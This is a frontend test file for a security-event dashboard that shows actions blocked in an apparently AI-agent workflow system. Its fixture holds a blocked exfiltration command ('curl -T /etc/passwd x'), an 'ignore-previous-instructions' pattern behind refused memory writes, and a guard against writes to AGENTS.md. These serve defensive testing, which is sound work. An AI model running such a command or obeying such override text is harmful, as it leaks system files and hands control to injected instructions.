// @vitest-environment jsdom

import { fireEvent, render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import type { SecurityEvent } from '@/hooks/useAdmin';
import { classifyTraceAsSecurityEvent, SecurityEventList } from './SecurityEventList';

const base: SecurityEvent = {
  createdAt: '2026-09-01T00:00:00Z',
  error: 'blocked by shell command scanner: curl upload',
  eventType: 'SHELL_BLOCK',
  externalTicketId: 'JIRA-9',
  id: 'e1',
  inputJson: { command: 'curl -T /etc/passwd x' },
  nodeId: 'executeImplementation',
  outputJson: null,
  runId: 'run-9',
  startedAt: '2026-09-01T00:00:00Z',
  toolName: 'bash',
  workflowId: 'eng-acme-svc-JIRA-9',
  workRequestId: 'wr-9',
};

describe('SecurityEventList', () => {
  it('links an event to its run, outside the row toggle', () => {
    render(<SecurityEventList events={[base]} showRunLink />);

    const link = screen.getByRole('link', { name: 'JIRA-9' });
    expect(link.getAttribute('href')).toBe('/runs/run-9');
    // A link nested inside a <button> is invalid and unreachable by keyboard.
    expect(link.closest('button')).toBeNull();
  });

  it('shows the workflow ID for an event from a workflow that keeps no run', () => {
    render(
      <SecurityEventList
        events={[{ ...base, externalTicketId: null, runId: null, workflowId: 'eval-run-42' }]}
        showRunLink
      />
    );

    expect(screen.queryByRole('link')).toBeNull();
    expect(screen.getByText('eval-run-42')).toBeTruthy();
  });

  it('still expands the detail from the row button', () => {
    render(<SecurityEventList events={[base]} showRunLink />);

    // The summary line already shows the command; expanding adds the detail block.
    const before = screen.getAllByText(/curl -T/).length;
    fireEvent.click(screen.getByRole('button'));

    expect(screen.getAllByText(/curl -T/).length).toBeGreaterThan(before);
  });
});

describe('SecurityEventList memory events', () => {
  it('names a refused memory write in words, not by its event name', () => {
    render(
      <SecurityEventList
        events={[
          {
            ...base,
            error: null,
            eventType: 'MEMORY_WRITE_REFUSED',
            inputJson: null,
            outputJson: { patterns: ['ignore-previous-instructions'] },
            toolName: 'memory.lesson_refused',
          },
        ]}
      />
    );

    expect(screen.getByText('Lesson refused')).toBeTruthy();
    expect(screen.queryByText(/memory\.lesson_refused/)).toBeNull();
  });

  it('names a dropped transcript digest entry apart from a dropped recall', () => {
    render(
      <SecurityEventList
        events={[
          {
            ...base,
            error: null,
            eventType: 'MEMORY_RECALL_DROPPED',
            inputJson: null,
            outputJson: { count: 2, patterns: ['ignore-previous-instructions'] },
            toolName: 'memory.transcript_digest_dropped',
          },
        ]}
      />
    );

    expect(screen.getByText('2 transcript digest entries dropped')).toBeTruthy();
  });
});

describe('SecurityEventList rows', () => {
  it('is only a toggle when the event has detail, and shows the absolute time on hover', () => {
    const noDetail: SecurityEvent = {
      ...base,
      eventType: 'LLM_SUSPICIOUS',
      id: 'e2',
      inputJson: null,
      outputJson: { warnings: [] },
    };
    render(<SecurityEventList events={[noDetail]} />);
    expect(screen.queryByRole('button')).toBeNull();
    const time = document.querySelector('time');
    expect(time?.getAttribute('title')).toMatch(/2026/);
  });

  it('names an event type in words, not enum text', () => {
    render(<SecurityEventList events={[base]} />);
    expect(screen.getByText('Command blocked')).toBeTruthy();
  });
});

describe('classifying a trace the dashboard already holds', () => {
  const trace = (error: string) => ({
    error,
    toolName: 'writeFile',
    type: 'tool_call',
  });

  it('gives an instruction-file refusal its own event type, not the file scanner', () => {
    expect(classifyTraceAsSecurityEvent(trace('blocked by repository instruction guard'))).toBe(
      'INSTRUCTION_FILE_BLOCK'
    );
    expect(classifyTraceAsSecurityEvent(trace('blocked by sensitive file scanner'))).toBe(
      'FILE_BLOCK'
    );
  });

  it('renders it as a blocked instruction-file write, naming the file', () => {
    render(
      <SecurityEventList
        events={[
          {
            ...base,
            error: 'blocked by repository instruction guard',
            eventType: 'INSTRUCTION_FILE_BLOCK',
            inputJson: { path: 'AGENTS.md' },
            outputJson: { result: "Path rejected: AGENTS.md is the repository's project …" },
          },
        ]}
      />
    );

    // Its own badge, and the file it refused, without expanding anything.
    expect(screen.getByText('Instruction file write blocked')).toBeTruthy();
    expect(screen.getByText('AGENTS.md')).toBeTruthy();
  });
});
